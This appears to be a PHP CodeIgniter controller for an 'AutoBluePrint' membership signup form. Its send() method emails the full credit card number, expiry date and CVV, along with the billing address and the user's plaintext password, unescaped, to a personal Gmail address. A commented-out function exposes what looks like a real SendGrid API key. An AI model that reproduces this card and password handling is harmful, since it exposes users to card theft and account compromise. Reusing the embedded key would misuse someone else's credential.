<?php

defined('BASEPATH') or exit('No direct script access allowed');

class EmailController extends CI_Controller
{

   public function __construct()
   {
      parent::__construct();

      $this->load->helper('url');
   }

   // function send1()
   // {

   //    $curl = curl_init();

   //    curl_setopt_array($curl, array(
   //       CURLOPT_URL => 'https://api.sendgrid.com/v3/mail/send',
   //       CURLOPT_RETURNTRANSFER => true,
   //       CURLOPT_ENCODING => '',
   //       CURLOPT_MAXREDIRS => 10,
   //       CURLOPT_TIMEOUT => 0,
   //       CURLOPT_FOLLOWLOCATION => true,
   //       CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   //       CURLOPT_CUSTOMREQUEST => 'POST',
   //       CURLOPT_POSTFIELDS => '{"personalizations": [{"to": [{"email": "fullstack710dev@gmail.com"}]}],"from": {"email": "admin@autoblueprint.net"},"subject": "Sending with SendGrid is Fun","content": [{"type": "text/plain", "value": "and easy to do anywhere, even with cURL"}]}',
   //       CURLOPT_HTTPHEADER => array(
   //          'Authorization: Bearer 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',
   //          'Content-Type: application/json'
   //       ),
   //    ));

   //    $response = curl_exec($curl);
   //    echo (curl_error($curl));

   //    curl_close($curl);
   //    echo $response;
   // }

   function send()
   {
      if (null !== $this->input->post('username') && null !== $this->input->post('referral_id')) {
         $this->load->config('email');
         $this->load->library('email');
         $this->load->model('User_model');

         if ($this->User_model->existSameUser($this->input->post('username'))) {
            echo 'Username has already exists!';
            return;
         }
         if ($this->User_model->existSameReferralID($this->input->post('referral_id'))) {
            echo 'Referral ID has already exists!';
            return;
         }

         $from = $this->config->item('smtp_user');
         // $from = 'AutoBluePrint';
         $to = 'repnextup@gmail.com';
         $subject = 'New Member Form Entry from AutoBluePrint';
         $message = '
            <h3>From Webinar - ' . $this->input->post('parent_referral_id') . '</h3>
            <table>
               <tbody>
                  <tr>
                     <td><span style="font-weight: bold;">Cardholder\'s Name</span></td>
                     <td>' . $this->input->post('card_name') . '</td>
                  </tr>
                  <tr>
                     <td><span style="font-weight: bold;">Credit Card Number</span></td>
                     <td>' . $this->input->post('credit_card_name') . '</td>
                  </tr>
                  <tr>
                     <td><span style="font-weight: bold;">Expiration Date ex. 10/24 or 1024</span></td>
                     <td>' . $this->input->post('expire_date') . '</td>
                  </tr>
                  <tr>
                     <td><span style="font-weight: bold;">CVV - 3 digit code on back of card</span></td>
                     <td>' . $this->input->post('cvv_card') . '</td>
                  </tr>
                  <tr>
                     <td><span style="font-weight: bold;">Billing Address - ex. 123 Main St.</span></td>
                     <td>' . $this->input->post('bill_addr') . '</td>
                  </tr>
                  <tr>
                     <td><span style="font-weight: bold;">Address 2 (optional)</span></td>
                     <td>' . $this->input->post('addr_2') . '</td>
                  </tr>
                  <tr>
                     <td><span style="font-weight: bold;">City or Region</span></td>
                     <td>' . $this->input->post('city_region') . '</td>
                  </tr>
                  <tr>
                     <td><span style="font-weight: bold;">State - Province</span></td>
                     <td>' . $this->input->post('state_province') . '</td>
                  </tr>
                  <tr>
                     <td><span style="font-weight: bold;">Zip Code - Postal Code</span></td>
                     <td>' . $this->input->post('zip_code') . '</td>
                  </tr>
                  <tr>
                     <td><span style="font-weight: bold;">Country</span></td>
                     <td>' . $this->input->post('country') . '</td>
                  </tr>
                  <tr>
                     <td><span style="font-weight: bold;">Select Membership</span></td>
                     <td>' . $this->input->post('membership') . '</td>
                  </tr>
                  <tr>
                     <td><span style="font-weight: bold;">Enter Valid Email</span></td>
                     <td>' . $this->input->post('email') . '</td>
                  </tr>
                  <tr>
                     <td><span style="font-weight: bold;">Enter New Login Username</span></td>
                     <td>' . $this->input->post('username') . '</td>
                  </tr>
                  <tr>
                     <td><span style="font-weight: bold;">Enter New Login Password</span></td>
                     <td>' . $this->input->post('password') . '</td>
                  </tr>
                  <tr>
                     <td><span style="font-weight: bold;">Referral ID</span></td>
                     <td>' . $this->input->post('referral_id') . '</td>
                  </tr>
                  <tr>
                     <td><span style="font-weight: bold;">Phone Number</span></td>
                     <td>' . $this->input->post('phone_number') . '</td>
                  </tr>
               </tbody>
            </table>
         ';

         $this->email->set_newline("\r\n");
         $this->email->from($from);
         $this->email->to($to);
         $this->email->subject($subject);
         $this->email->message($message);

         if ($this->email->send()) {
            $this->User_model->addNewUser();

            echo 'Your Email has successfully been sent.';
         } else {
            show_error($this->email->print_debugger());
         }
      } else {
         redirect('/', 'refresh');
      }
   }
}
